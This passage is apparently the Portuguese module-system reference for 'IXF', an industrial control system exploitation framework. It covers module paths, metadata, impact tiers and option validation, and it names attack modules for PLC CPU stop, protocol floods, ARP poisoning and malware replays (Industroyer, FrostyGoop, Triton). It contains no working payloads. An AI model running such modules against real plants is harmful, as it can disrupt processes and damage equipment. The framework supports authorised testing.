# Sistema de Módulos

Este documento é a referência definitiva para a arquitetura de módulos do IXF. Cobre cada aspecto de escrita, carregamento e execução de módulos: convenções de caminho, taxonomia de categorias, anatomia do módulo, todas as 13 chaves `__info__`, todos os 10 tipos de opção com regras completas de validação, decoradores, padrões de métodos, internos da metaclasse e a API completa de descoberta.

---

## Índice

1. [Convenções de Caminho de Módulo](#convenções-de-caminho-de-módulo)
2. [Categorias de Módulo](#categorias-de-módulo)
3. [Anatomia do Módulo](#anatomia-do-módulo)
4. [Dicionário `__info__`](#dicionário-__info__)
5. [Tipos de Opção](#tipos-de-opção)
   - [OptIP](#optip)
   - [OptPort](#optport)
   - [OptInteger](#optinteger)
   - [OptFloat](#optfloat)
   - [OptString](#optstring)
   - [OptBool](#optbool)
   - [OptMAC](#optmac)
   - [OptWordlist](#optwordlist)
   - [OptEncoder](#optencoder)
   - [Opções Avançadas](#opções-avançadas)
6. [Decoradores](#decoradores)
   - [@mute](#mute)
   - [@multi](#multi)
7. [Padrões de Método](#padrões-de-método)
   - [check()](#padrão-check)
   - [run()](#padrão-run)
8. [Método `get_info()`](#método-get_info)
9. [Enum de Protocolo](#enum-de-protocolo)
10. [Metaclasse: ExploitOptionsAggregator](#metaclasse-exploitoptionsaggregator)
11. [API de Descoberta](#api-de-descoberta)
12. [Validação de Módulo](#validação-de-módulo)
13. [Exemplo Completo de Módulo](#exemplo-completo-de-módulo)

---

## Convenções de Caminho de Módulo

Módulos vivem em `industrialxpl/modules/` e são referenciados pelo seu caminho relativo a esse diretório. O IXF aceita duas notações equivalentes em qualquer lugar onde um caminho de módulo é esperado.

### Notação com Barras (exibição no shell)

Usada no shell interativo para os comandos `use`, `search`, `info` e `show`. Visualmente parece um caminho de sistema de arquivos.

```
scanners/ics/modbus_detect
scanners/ics/s7_enumerate
scanners/osint/shodan_ics_dork
creds/siemens/s7_default_creds
creds/rockwell/logix_default_creds
exploits/protocols/modbus/modbus_fc90_dos
exploits/protocols/dnp3/dnp3_unsolicit_flood
exploits/protocols/s7/s7_stop_cpu
exploits/protocols/enip/enip_list_identity
exploits/protocols/bacnet/bacnet_who_is_flood
exploits/plc/siemens/s7_1200_hardcoded_key
exploits/plc/rockwell/logix5000_urdf_dos
exploits/scada/ignition/ignition_rce
cve/siemens/cve_2021_22681_s7_1200_hardcoded_key
cve/rockwell/cve_2022_1159_logix5000_heap_overflow
cve/apt/sandworm_industroyer_iec104
cve/malware/crashoverride_industroyer
cve/malware/frostygoop_modbus_heating
assessment/mitre_ics/t0843_program_upload
assessment/iec62443/zone_conduit_audit
```

### Notação com Pontos (caminho de importação Python)

Equivalente à notação com barras usando `.` como separador. Usada em contextos programáticos (`import_exploit`, `index_modules`), scripts Python e alguns comandos do shell internamente.

```
scanners.ics.modbus_detect
scanners.ics.s7_enumerate
creds.siemens.s7_default_creds
exploits.protocols.modbus.modbus_fc90_dos
exploits.plc.siemens.s7_1200_hardcoded_key
cve.siemens.cve_2021_22681_s7_1200_hardcoded_key
cve.malware.crashoverride_industroyer
assessment.mitre_ics.t0801_monitor_process_state
assessment.iec62443.zone_conduit_audit
```

As duas notações são completamente intercambiáveis no shell. O comando `use` normaliza barras para pontos internamente via `pythonize_path()`, e converte pontos de volta para barras via `humanize_path()` para exibição.

### Regras de Construção de Caminho

| Regra | Exemplo |
|-------|---------|
| Tudo em minúsculas | `cve/siemens/cve_2021_22681_...` |
| Sublinhados para separar palavras | `modbus_detect`, não `modbus-detect` |
| Caminhos CVE incluem o ID CVE completo | `cve_2021_22681_s7_1200_hardcoded_key` |
| Módulos de técnica MITRE prefixados com `tNNNN_` | `t0801_monitor_process_state` |
| Vendor-específico agrupado sob pasta do vendor | `cve/siemens/`, `creds/rockwell/` |
| Nome do arquivo corresponde ao propósito da classe | `modbus_detect.py` define lógica de detecção |

### Prefixo para Caminho Completo de Importação

Ao chamar `import_exploit()` ou construir caminhos de importação absolutos, preceda com `industrialxpl.modules.`:

```python
# Notação de barra do shell      -> Caminho de importação Python absoluto
"cve/siemens/cve_2021_22681"  -> "industrialxpl.modules.cve.siemens.cve_2021_22681"
"scanners/ics/modbus_detect"  -> "industrialxpl.modules.scanners.ics.modbus_detect"
```

---

## Categorias de Módulo

A árvore de módulos é organizada por função e superfície de ataque. A tabela abaixo mostra cada diretório de nível superior e suas subcategorias.

### `exploits/protocols/`

Módulos de abuso de design de protocolo. Exploram fraquezas incorporadas nas especificações de protocolo industrial, não bugs de software do vendor.

| Subcategoria | Caminho de Exemplo | Descrição |
|---|---|---|
| `modbus/` | `exploits/protocols/modbus/modbus_fc90_dos` | Abuso de function code Modbus (FC3, FC6, FC16, FC90) |
| `dnp3/` | `exploits/protocols/dnp3/dnp3_unsolicit_flood` | Flood de resposta DNP3 não solicitada |
| `s7/` | `exploits/protocols/s7/s7_stop_cpu` | CPU stop S7 via PDU |
| `enip/` | `exploits/protocols/enip/enip_list_identity` | Scan de identidade EtherNet/IP / injeção de comando CIP |
| `bacnet/` | `exploits/protocols/bacnet/bacnet_who_is_flood` | Flood broadcast BACnet Who-Is |
| `iec104/` | `exploits/protocols/iec104/iec104_startdt_flood` | Abuso de STARTDT/TESTFR IEC 60870-5-104 |
| `opcua/` | `exploits/protocols/opcua/opcua_browse_leak` | Leak não autenticado de árvore OPC UA |
| `profinet/` | `exploits/protocols/profinet/profinet_dcp_flood` | Flood multicast PROFINET DCP |

### `exploits/plc/`

Exploits PLC específicos de vendor. Visam firmware, bootloaders e extensões de protocolo proprietárias.

| Subcategoria | Caminho de Exemplo | Descrição |
|---|---|---|
| `siemens/` | `exploits/plc/siemens/s7_1200_hardcoded_key` | Chave criptográfica hardcoded S7-1200/1500 |
| `rockwell/` | `exploits/plc/rockwell/logix5000_urdf_dos` | DoS de frame não reconhecido ControlLogix 5000 |
| `schneider/` | `exploits/plc/schneider/modicon_m340_auth_bypass` | Sessão não autenticada Modicon M340 |
| `ge/` | `exploits/plc/ge/srtp_ge_rx3i_dos` | DoS de protocolo GE SRTP no RX3i |
| `mitsubishi/` | `exploits/plc/mitsubishi/melsec_melsecnet_rce` | RCE em série MELSEC-Q |

### `exploits/scada/`

Exploits de software SCADA/HMI. Visam servidores historian, aplicações HMI e interfaces web SCADA.

| Subcategoria | Caminho de Exemplo | Descrição |
|---|---|---|
| `ignition/` | `exploits/scada/ignition/ignition_rce` | RCE Inductive Automation Ignition |
| `wonderware/` | `exploits/scada/wonderware/archestra_dcom_exec` | Execução DCOM Wonderware ArchestrA |
| `ge_cimplicity/` | `exploits/scada/ge_cimplicity/cimplicity_path_traversal` | Path traversal GE Cimplicity |
| `kepware/` | `exploits/scada/kepware/kepserverex_buffer_overflow` | Buffer overflow OPC DA KEPServerEX |

### `scanners/ics/`

Descoberta e fingerprinting específicos de protocolo. Módulos somente-leitura para inventário de ativos.

| Caminho de Exemplo | Descrição |
|---|---|
| `scanners/ics/modbus_detect` | Proba de porta TCP Modbus e enumeração de unit ID |
| `scanners/ics/s7_enumerate` | Info CPU S7comm, versão firmware, nível de proteção |
| `scanners/ics/enip_list_identity` | Broadcast EtherNet/IP List Identity |
| `scanners/ics/bacnet_device_id` | Leitura de propriedade BACnet — ID de dispositivo e nome do vendor |
| `scanners/ics/dnp3_link_status` | Requisição DNP3 Link Status |
| `scanners/ics/opcua_endpoints` | Enumeração não autenticada de endpoints OPC UA |
| `scanners/ics/profinet_dcp_identify` | Identificação de dispositivo PROFINET DCP |
| `scanners/ics/iec104_connect` | Teste de conexão IEC 60870-5-104 STARTDT |

### `cve/`

Módulos PoC de exploit específicos de CVE. Cada módulo implementa o PoC para um CVE.

| Subcategoria | Descrição |
|---|---|
| `cve/siemens/` | CVEs de produtos Siemens (S7-1200, S7-1500, WinCC, SIMATIC) |
| `cve/rockwell/` | CVEs Rockwell Automation / Allen-Bradley |
| `cve/schneider/` | CVEs Schneider Electric (Modicon, EcoStruxure) |
| `cve/ge/` | CVEs de automação General Electric |
| `cve/mitsubishi/` | CVEs de automação Mitsubishi Electric |
| `cve/honeywell/` | CVEs de DCS Honeywell e controladores de segurança |
| `cve/apt/` | Módulos de simulação de TTP de campanhas APT reais |
| `cve/malware/` | Módulos de replay de TTP de malware ICS real |

### `assessment/`

Módulos de assessment de conformidade, risco e playbooks de resposta a incidentes.

| Caminho de Exemplo | Descrição |
|---|---|
| `assessment/mitre_ics/t0843_program_upload` | Técnica MITRE T0843 |
| `assessment/iec62443/zone_conduit_audit` | Auditoria de zona e conduto IEC 62443-3-2 |
| `assessment/risk/ics_risk_score` | Score de risco OT composto |
| `assessment/ir/iacs_ir_playbook` | Playbook de IR IEC 62443-2-1 / NIST SP 800-61r3 |

---

## Anatomia do Módulo

Todo módulo é um único arquivo Python contendo uma classe chamada `Exploit` (ou `Scanner` ou `Assessment`) que herda da base `Exploit` importada. O nome da classe oculta a importação, o que é intencional e exigido pelo carregador IXF.

```python
"""Descrição de uma linha do módulo usada no texto de ajuda.

Descrição extendida. Mantenha o docstring do módulo factual:
qual protocolo ou CVE está sendo visado, o que o exploit faz, e qual
o resultado esperado.
"""

# Importações de biblioteca padrão primeiro
import socket
import struct
from typing import Optional

# Importações IXF segundo
from industrialxpl.core.exploit import (
    # Classe base — sua classe DEVE usar este nome (shadowing intencional)
    Exploit,
    # Descritores de opção — declare como atributos de nível de classe
    OptBool,
    OptIP,
    OptInteger,
    OptPort,
    OptString,
    # Decoradores
    mute,
    multi,
    # Funções de impressão
    print_error,
    print_info,
    print_status,
    print_success,
    print_warning,
    # Portão de segurança
    DestructiveGate,
)


class Exploit(Exploit):
    # ── Dicionário de metadados ───────────────────────────────────────────────
    __info__ = {
        "name":             "CVE-AAAA-NNNNN Vendor Produto Modelo",
        "description":      (
            "Explora um estouro de buffer de pilha no handler de atualização "
            "de firmware do Vendor Produto Modelo. Alcança execução de código "
            "remoto não autenticado como root no PLC alvo."
        ),
        "authors":          ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references":       (
            "https://www.cisa.gov/ics-advisories/ICSA-AA-NNN-NN",
            "https://nvd.nist.gov/vuln/detail/CVE-AAAA-NNNNN",
        ),
        "devices":          (
            "Vendor Produto Modelo v1.0 - v2.3",
            "Vendor Produto Modelo v3.0 (firmware < 3.1.4)",
        ),
        "impact":           "CRITICAL",
        "exploit_type":     "Stack Buffer Overflow",
        "source_poc":       "https://github.com/example/poc",
        "cve":              "CVE-AAAA-NNNNN",
        "cvss":             "9.8",
        "severity":         "CRITICAL",
        "mitre_techniques": ["T0866", "T0821"],
        "mitre_tactics":    ["Lateral Movement", "Inhibit Response Function"],
        "destructive_description": (
            "Envia PDU de atualização de firmware malformada que desencadeia "
            "buffer overflow no serviço de atualização do PLC alvo."
        ),
    }

    # ── Declarações de opção ─────────────────────────────────────────────────
    target      = OptIP("",    "IP ou hostname do dispositivo alvo")
    port        = OptPort(102, "Porta S7comm (padrão: 102)")
    timeout     = OptInteger(5, "Timeout de conexão (segundos)", min_value=1, max_value=60)
    slot        = OptInteger(2, "Número de rack/slot do PLC", min_value=0, max_value=31)
    simulate    = OptBool(True,  "Modo simulação: descreve a ação sem enviar payload")
    destructive = OptBool(False, "Habilitar exploração ao vivo — pode causar danos")

    # ── Método check() ───────────────────────────────────────────────────────
    @mute
    def check(self) -> bool:
        """Proba de conectividade somente-leitura — nunca envia exploit payloads."""
        if not self.target:
            return False
        try:
            s = socket.socket()
            s.settimeout(self.timeout)
            s.connect((self.target, self.port))
            s.close()
            return True
        except Exception:
            return False

    # ── Método run() ─────────────────────────────────────────────────────────
    def run(self) -> None:
        """Executa o exploit ou descreve o que aconteceria em modo simulação."""
        if not self.target:
            print_error("Defina 'target' primeiro. Exemplo: set target 192.168.1.100")
            return

        if self.simulate:
            DestructiveGate.print_simulation(
                description=(
                    "CVE-AAAA-NNNNN Vendor Produto — Stack Buffer Overflow\n\n"
                    "Passo 1: Conectar a {}:{} (S7comm)\n"
                    "Passo 2: Enviar PDU de atualização de firmware malformada\n"
                    "Passo 3: Sobrescrever endereço de retorno\n"
                    "Passo 4: Shellcode executa shell reverso na porta 4444\n"
                    "Impacto Físico: Crash do PLC ou execução de código"
                ).format(self.target, self.port),
                payload_hex="03 00 00 XX 02 F0 80 72 01 00 ... <shellcode>",
                payload_human="PDU de firmware malformada com campo 'update_data' excessivamente longo",
                mitre_techniques=["T0866", "T0821"],
            )
            return

        # Caminho ao vivo
        print_status("[CVE-AAAA-NNNNN] Conectando a {}:{}...".format(self.target, self.port))
        try:
            s = socket.socket()
            s.settimeout(self.timeout)
            s.connect((self.target, self.port))
            print_success("[CVE-AAAA-NNNNN] Conexão estabelecida.")
            s.close()
        except Exception as exc:
            print_error("Erro: {}".format(exc))
```

---

## Dicionário `__info__`

Todo corpo de classe de módulo deve conter um dicionário `__info__`. A metaclasse `ExploitOptionsAggregator` intercepta esta chave e a armazena sob `_{NomeClasse}__info__` para sobreviver ao name mangling do Python.

A tabela abaixo documenta todas as 13 chaves válidas.

| Chave | Tipo | Obrigatório | Valores Válidos | Descrição |
|-------|------|-------------|-----------------|-----------|
| `name` | `str` | Sim | Qualquer string | Nome legível por humanos do módulo. Exibido em `show info`, `search` e no banner do prompt. |
| `description` | `str` | Sim | Qualquer string | Uma a três frases descrevendo a vulnerabilidade e o que o módulo faz. |
| `authors` | `tuple[str]` | Sim | Tupla de strings | Autor(es) deste módulo. Deve ser uma `tuple`, não uma `list`. Único autor: `("Nome",)` — note a vírgula final. |
| `references` | `tuple[str]` | Sim | Tupla de strings URL | URLs de advisory, repositórios PoC, boletins de segurança do vendor, artigos acadêmicos ou referências de padrões. |
| `devices` | `tuple[str]` | Sim | Tupla de strings | Dispositivos ou softwares afetados, incluindo faixa de versão quando conhecida. |
| `impact` | `str` | Sim | `INFO`, `READ`, `LOW`, `MEDIUM`, `HIGH`, `CRITICAL`, `CATASTROPHIC` | Determina o tier de confirmação do DestructiveGate. |
| `exploit_type` | `str` | Sim | Qualquer label curto | Categoria curta para busca e filtragem. Valores comuns: `"Stack Buffer Overflow"`, `"Default Credentials"`, `"Denial of Service"`, `"Protocol Abuse"`. |
| `source_poc` | `str` | Não | String URL ou `"IXF native"` | URL do PoC público original. Use `"IXF native"` para módulos sem PoC externo. |
| `cve` | `str` | Sim | `"CVE-AAAA-NNNNN"` ou `"N/A"` | Identificador CVE. Use `"N/A"` para zero-days, técnicas MITRE ou verificações de conformidade. |
| `cvss` | `str` | Sim | `"0.0"` a `"10.0"` ou `"N/A"` | Score base CVSS v3.1 como string. |
| `severity` | `str` | Sim | `INFO`, `LOW`, `MEDIUM`, `HIGH`, `CRITICAL` ou `"N/A"` | Label de severidade correspondendo ao tier CVSS. |
| `mitre_techniques` | `list[str]` | Sim | Lista de IDs de técnica ICS | IDs de técnica MITRE ATT&CK para ICS. Use IDs da matriz ICS (`T08xx`), não Enterprise (`T1xxx`). |
| `mitre_tactics` | `list[str]` | Sim | Lista de nomes de tática ICS | Nomes de tática MITRE ATT&CK para ICS. Deve usar os nomes exatos: `"Collection"`, `"Lateral Movement"`, `"Inhibit Response Function"`, `"Impair Process Control"`, `"Impact"`, etc. |
| `destructive_description` | `str` | Não | Qualquer string (máx ~72 chars) | Texto opcional exibido no banner do DestructiveGate. Se omitido, usa a `description` do módulo. |

### Níveis de Impacto — Especificação Completa

| Nível | String de Descrição Exata (do código) | Quando Aplicar | Confirmação Exigida | Exemplos de Módulos |
|-------|---------------------------------------|---------------|--------------------|--------------------|
| `INFO` | `"Passive observation only. No packets sent."` | Módulos que nunca tocam a rede. Checklists, geradores de relatório. | Automática — sem prompt | `assessment/mitre_ics/coverage_report`, `assessment/ir/iacs_ir_playbook` |
| `READ` | `"Read-only queries. No state change on target."` | Módulos que leem dados do alvo sem jamais escrever ou modificar. | Automática — sem prompt | `scanners/ics/modbus_detect`, `scanners/ics/s7_enumerate` |
| `LOW` | `"Non-destructive write. Reversible."` | Módulos que escrevem dados não críticos. A mudança é facilmente revertida. | Aviso exibido, sem confirmação | `exploits/protocols/modbus/modbus_single_coil_write` |
| `MEDIUM` | `"Process parameter modification. May affect operation. Reversible."` | Módulos que alteram parâmetros de processo (setpoints, timers). | Pressionar Enter para confirmar | `exploits/protocols/modbus/modbus_fc16_write_registers` |
| `HIGH` | `"Device restart / process stop. Requires operator intervention."` | Módulos que param uma CPU PLC, disparam reinicialização ou interrompem processo. | Digitar string exata de confirmação | `exploits/protocols/s7/s7_stop_cpu`, `creds/siemens/s7_default_creds` |
| `CRITICAL` | `"Firmware modification / safety bypass / PLC logic overwrite. MAY BE IRREVERSIBLE."` | Módulos que modificam firmware, sobrescrevem lógica PLC ou bypassam intertraves de segurança. | Digitar string exata de confirmação | `cve/siemens/cve_2021_22681_s7_1200_hardcoded_key` |
| `CATASTROPHIC` | `"Physical equipment damage / safety system disabling. IRREVERSIBLE."` | Módulos que podem danificar equipamento físico, desabilitar sistemas de segurança (SIS). | String exata + contagem regressiva obrigatória de 10 segundos | `cve/malware/frostygoop_modbus_heating`, `cve/apt/triton_triconex_safety_overwrite` |

---

## Tipos de Opção

Módulos declaram opções como descritores de nível de classe. A metaclasse `ExploitOptionsAggregator` os coleta em `exploit_attributes` para autocompletar com Tab, `show options` e `show advanced`. A cada comando `set` o shell chama o método `validate()` do descritor; em caso de falha um `OptionValidationError` é levantado e o valor não é alterado.

Todos os construtores de opção compartilham esta assinatura base herdada de `Option`:

```python
Option(default: Any, description: str, *, advanced: bool = False)
```

O keyword `advanced=True` esconde a opção de `show options` e a exibe apenas em `show advanced`.

---

### `OptIP`

**Arquivo:** `industrialxpl/core/exploit/option.py`

Aceita um endereço IPv4 (validado via `ipaddress.ip_address`) ou um hostname (validado como alfanumérico com caracteres `-`, `_`, `.` apenas). Uma string vazia é sempre válida e significa "não definido".

**Construtor:**
```python
OptIP(default: str, description: str, *, advanced: bool = False)
```

**Lógica de validação:**
1. Remover espaços em branco da entrada.
2. Se string vazia, aceitar imediatamente.
3. Tentar `ipaddress.ip_address(value)` — aceita qualquer endereço IPv4 ou IPv6 válido.
4. Se falhar, verificar se cada caractere é alfanumérico ou está em `{'-', '_', '.'}` — aceita hostnames e FQDN.
5. Se o passo 4 também falhar, levantar `OptionValidationError`.

**Declaração:**
```python
target = OptIP("", "IP ou hostname do dispositivo alvo")
```

**Entradas válidas:**

| Entrada | Aceito? | Notas |
|---------|---------|-------|
| `"192.168.1.100"` | Sim | IPv4 válido |
| `"10.0.0.1"` | Sim | IPv4 válido |
| `"::1"` | Sim | Loopback IPv6 |
| `"plc-01.factory.local"` | Sim | FQDN válido |
| `"target_host"` | Sim | Alfanumérico com sublinhado |
| `""` | Sim | Vazio = não definido |

**Entradas inválidas:**

| Entrada | Mensagem de Erro |
|---------|-----------------|
| `"999.999.999.999"` | `'999.999.999.999' is not a valid IP address or hostname.` |
| `"192.168.1.100:502"` | `'192.168.1.100:502' is not a valid IP address or hostname.` |
| `"host name"` | `'host name' is not a valid IP address or hostname.` |
| `"not_valid!"` | `'not_valid!' is not a valid IP address or hostname.` |

**Sessão de terminal:**
```
ixf (CVE-2021-22681 S7-1200) > set target 192.168.1.100
[*] target => 192.168.1.100

ixf (CVE-2021-22681 S7-1200) > set target plc-01.factory.local
[*] target => plc-01.factory.local

ixf (CVE-2021-22681 S7-1200) > set target 192.168.1.100:502
[-] Erro de validação para 'target': '192.168.1.100:502' is not a valid IP address or hostname.

ixf (CVE-2021-22681 S7-1200) > set target not_a_hostname!
[-] Erro de validação para 'target': 'not_a_hostname!' is not a valid IP address or hostname.

ixf (CVE-2021-22681 S7-1200) > set target ""
[*] target => 
```

---

### `OptPort`

**Arquivo:** `industrialxpl/core/exploit/option.py`

Aceita um número de porta TCP ou UDP. Internamente sempre armazenado como `int`. Entradas string são convertidas com `int()`.

**Construtor:**
```python
OptPort(default: int, description: str, *, advanced: bool = False)
```

**Lógica de validação:**
1. Tentar `int(value)` — aceita qualquer entrada conversível para inteiro incluindo string `"502"`.
2. Se a conversão falhar, levantar `OptionValidationError`.
3. Verificar `1 <= porta <= 65535`. Se fora do intervalo, levantar `OptionValidationError`.

**Portas padrão comuns por protocolo:**

| Protocolo | Porta Padrão | Declaração |
|-----------|-------------|------------|
| Modbus TCP | 502 | `port = OptPort(502, "Porta Modbus TCP")` |
| S7comm / TSAP | 102 | `port = OptPort(102, "Porta S7comm")` |
| EtherNet/IP | 44818 | `port = OptPort(44818, "Porta EtherNet/IP")` |
| DNP3 | 20000 | `port = OptPort(20000, "Porta DNP3")` |
| BACnet/IP | 47808 | `port = OptPort(47808, "Porta BACnet/IP")` |
| OPC UA | 4840 | `port = OptPort(4840, "Porta OPC UA")` |
| IEC 60870-5-104 | 2404 | `port = OptPort(2404, "Porta IEC 104")` |

**Sessão de terminal:**
```
ixf (Modbus FC90 DoS) > set port 502
[*] port => 502

ixf (Modbus FC90 DoS) > set port 65535
[*] port => 65535

ixf (Modbus FC90 DoS) > set port 0
[-] Erro de validação para 'port': Port must be in range 1-65535, got: 0

ixf (Modbus FC90 DoS) > set port 65536
[-] Erro de validação para 'port': Port must be in range 1-65535, got: 65536

ixf (Modbus FC90 DoS) > set port tcp
[-] Erro de validação para 'port': Port must be an integer, got: 'tcp'
```

---

### `OptInteger`

**Arquivo:** `industrialxpl/core/exploit/option.py`

Aceita qualquer número inteiro. Os keywords opcionais `min_value` e `max_value` adicionam verificação de limites inclusivos.

**Construtor:**
```python
OptInteger(
    default: int,
    description: str,
    *,
    min_value: Optional[int] = None,
    max_value: Optional[int] = None,
    advanced: bool = False,
)
```

**Lógica de validação:**
1. Tentar `int(value)`.
2. Se `min_value` está definido e `v < min_value`, levantar `OptionValidationError` com mensagem `"{v} < minimum {min_value}"`.
3. Se `max_value` está definido e `v > max_value`, levantar `OptionValidationError` com mensagem `"{v} > maximum {max_value}"`.

**Padrões de declaração comuns:**
```python
unit_id  = OptInteger(1,   "Modbus unit ID (1-247)",       min_value=1,  max_value=247)
slot     = OptInteger(2,   "Número de rack/slot PLC (0-31)", min_value=0,  max_value=31)
timeout  = OptInteger(5,   "Timeout em segundos",           min_value=1,  max_value=120)
threads  = OptInteger(10,  "Número de threads concorrentes", min_value=1,  max_value=256)
retries  = OptInteger(3,   "Tentativas em caso de falha",   min_value=0,  max_value=10)
register = OptInteger(0,   "Endereço inicial do registrador", min_value=0, max_value=65535)
quantity = OptInteger(10,  "Número de registradores a ler", min_value=1,  max_value=125)
```

**Sessão de terminal:**
```
ixf (Modbus Detect) > set unit_id 1
[*] unit_id => 1

ixf (Modbus Detect) > set unit_id 247
[*] unit_id => 247

ixf (Modbus Detect) > set unit_id 0
[-] Erro de validação para 'unit_id': 0 < minimum 1

ixf (Modbus Detect) > set unit_id 300
[-] Erro de validação para 'unit_id': 300 > maximum 247

ixf (Modbus Detect) > set unit_id abc
[-] Erro de validação para 'unit_id': Expected integer, got: 'abc'
```

---

### `OptFloat`

**Arquivo:** `industrialxpl/core/exploit/option.py`

Aceita qualquer número de ponto flutuante. Sem verificação de limites embutida. Entradas string são convertidas com `float()`.

**Construtor:**
```python
OptFloat(default: float, description: str, *, advanced: bool = False)
```

**Lógica de validação:**
1. Tentar `float(value)`.
2. Se a conversão falhar, levantar `OptionValidationError` com mensagem `"Expected float, got: {value!r}"`.

**Entradas válidas:**

| Entrada | Armazenado como | Notas |
|---------|-----------------|-------|
| `1.5` | `1.5` | Float padrão |
| `0.0` | `0.0` | Zero |
| `-0.3` | `-0.3` | Negativo |
| `100` | `100.0` | Inteiro convertido automaticamente |
| `"0.5"` | `0.5` | String convertida automaticamente |
| `"1e-3"` | `0.001` | Notação científica |

**Entradas inválidas:**

| Entrada | Mensagem de Erro |
|---------|-----------------|
| `"abc"` | `Expected float, got: 'abc'` |
| `"1,5"` | `Expected float, got: '1,5'` (vírgula não é separador decimal) |
| `None` | `Expected float, got: None` |

**Declarações de exemplo:**
```python
rate_limit = OptFloat(0.5, "Limite de taxa de requisições em segundos entre pacotes")
jitter     = OptFloat(0.1, "Jitter aleatório adicionado ao rate limit (segundos)", advanced=True)
threshold  = OptFloat(0.9, "Limiar de confiança de detecção (0.0-1.0)")
```

**Sessão de terminal:**
```
ixf (DNP3 Flood) > set rate_limit 0.5
[*] rate_limit => 0.5

ixf (DNP3 Flood) > set rate_limit 0
[*] rate_limit => 0.0

ixf (DNP3 Flood) > set rate_limit abc
[-] Erro de validação para 'rate_limit': Expected float, got: 'abc'

ixf (DNP3 Flood) > set rate_limit 1,5
[-] Erro de validação para 'rate_limit': Expected float, got: '1,5'
```

---

### `OptString`

**Arquivo:** `industrialxpl/core/exploit/option.py`

Aceita qualquer valor de string. Nenhuma validação de formato é realizada. O método `validate()` chama `str(value)` incondicionalmente — isso significa que `OptString` nunca levanta `OptionValidationError` por conta própria.

**Construtor:**
```python
OptString(default: str, description: str, *, advanced: bool = False)
```

**Lógica de validação:**
1. Retornar `str(value)` — sempre bem-sucedido.

**Declarações de exemplo:**
```python
username       = OptString("admin",  "Nome de usuário para login")
password       = OptString("",       "Senha para login")
payload        = OptString("",       "String de payload customizado (hex ou ASCII)")
output_format  = OptString("table",  "Formato de saída: table | json | layer")
interface      = OptString("eth0",   "Interface de rede para operações de socket raw")
custom_command = OptString("",       "Comando customizado após RCE", advanced=True)
```

**Sessão de terminal:**
```
ixf (S7 Default Creds) > set username admin
[*] username => admin

ixf (S7 Default Creds) > set password ""
[*] password => 

ixf (S7 Default Creds) > set output_format json
[*] output_format => json

ixf (MITRE Coverage) > set output_format layer
[*] output_format => layer
```

---

### `OptBool`

**Arquivo:** `industrialxpl/core/exploit/option.py`

Aceita valores booleanos. Tanto booleanos Python nativos quanto representações em string são aceitos, sem distinção de maiúsculas/minúsculas.

**Construtor:**
```python
OptBool(default: bool, description: str, *, advanced: bool = False)
```

**Lógica de validação:**
1. Se o valor já é `bool`, retorná-lo diretamente.
2. Converter para string minúscula e remover espaços em branco.
3. Se em `{"true", "yes", "1", "on"}`, retornar `True`.
4. Se em `{"false", "no", "0", "off"}`, retornar `False`.
5. Caso contrário, levantar `OptionValidationError`.

**Entradas truthy válidas:**

| Entrada | Armazenado como |
|---------|-----------------|
| `True` | `True` |
| `"true"` | `True` |
| `"True"` | `True` |
| `"yes"` | `True` |
| `"YES"` | `True` |
| `"1"` | `True` |
| `"on"` | `True` |

**Entradas falsy válidas:**

| Entrada | Armazenado como |
|---------|-----------------|
| `False` | `False` |
| `"false"` | `False` |
| `"no"` | `False` |
| `"0"` | `False` |
| `"off"` | `False` |

**Entradas inválidas:**

| Entrada | Mensagem de Erro |
|---------|-----------------|
| `"talvez"` | `Expected boolean (true/false/yes/no), got: 'talvez'` |
| `"habilitado"` | `Expected boolean (true/false/yes/no), got: 'habilitado'` |
| `2` | `Expected boolean (true/false/yes/no), got: '2'` |
| `"y"` | `Expected boolean (true/false/yes/no), got: 'y'` |

**Declarações de exemplo:**
```python
simulate    = OptBool(True,  "Modo simulação: descreve a ação sem enviar payload (padrão: True)")
destructive = OptBool(False, "Habilitar exploração ao vivo — pode causar danos irreversíveis")
verbose     = OptBool(False, "Habilitar saída de debug detalhada", advanced=True)
ssl         = OptBool(False, "Usar TLS/SSL para conexão")
```

**Sessão de terminal:**
```
ixf (S7 Stop CPU) > set simulate false
[*] simulate => False

ixf (S7 Stop CPU) > set simulate yes
[*] simulate => True

ixf (S7 Stop CPU) > set destructive on
[*] destructive => True

ixf (S7 Stop CPU) > set verbose 1
[*] verbose => True

ixf (S7 Stop CPU) > set simulate talvez
[-] Erro de validação para 'simulate': Expected boolean (true/false/yes/no), got: 'talvez'

ixf (S7 Stop CPU) > set destructive habilitado
[-] Erro de validação para 'destructive': Expected boolean (true/false/yes/no), got: 'habilitado'
```

---

### `OptMAC`

**Arquivo:** `industrialxpl/core/exploit/option.py`

Aceita um endereço MAC. Os formatos com separadores `:` e `-` são aceitos. O valor armazenado é sempre normalizado para notação com dois-pontos em minúsculas.

**Construtor:**
```python
OptMAC(default: str, description: str, *, advanced: bool = False)
```

**Lógica de validação:**
1. Remover espaços em branco.
2. Substituir todos os `-` por `:` para normalizar separadores.
3. Dividir em `:` — deve produzir exatamente 6 partes.
4. Cada parte deve ter exatamente 2 caracteres de comprimento.
5. Se os passos 3-4 falharem, levantar `OptionValidationError`.
6. Retornar `value.lower()` — normalizado para minúsculas.

**Entradas válidas:**

| Entrada | Saída normalizada |
|---------|------------------|
| `"00:11:22:33:44:55"` | `"00:11:22:33:44:55"` |
| `"00-11-22-33-44-55"` | `"00:11:22:33:44:55"` |
| `"AA:BB:CC:DD:EE:FF"` | `"aa:bb:cc:dd:ee:ff"` |
| `"DE:AD:BE:EF:00:01"` | `"de:ad:be:ef:00:01"` |

**Entradas inválidas:**

| Entrada | Mensagem de Erro |
|---------|-----------------|
| `"00:11:22:33:44"` | `'00:11:22:33:44' is not a valid MAC address.` |
| `"AABBCCDDEEFF"` | `'AABBCCDDEEFF' is not a valid MAC address.` |
| `"00:1:22:33:44:55"` | `'00:1:22:33:44:55' is not a valid MAC address.` (octeto `1` tem apenas 1 char) |

**Declarações de exemplo:**
```python
target_mac  = OptMAC("", "Endereço MAC do dispositivo alvo para targeting ARP/PROFINET")
gateway_mac = OptMAC("", "MAC do gateway para ataque MitM (alvo de ARP poisoning)")
```

**Sessão de terminal:**
```
ixf (PROFINET DCP Identify) > set target_mac 00:1B:1B:0A:00:01
[*] target_mac => 00:1b:1b:0a:00:01

ixf (PROFINET DCP Identify) > set target_mac 00-1B-1B-0A-00-01
[*] target_mac => 00:1b:1b:0a:00:01

ixf (PROFINET DCP Identify) > set target_mac AABBCCDDEEFF
[-] Erro de validação para 'target_mac': 'AABBCCDDEEFF' is not a valid MAC address.

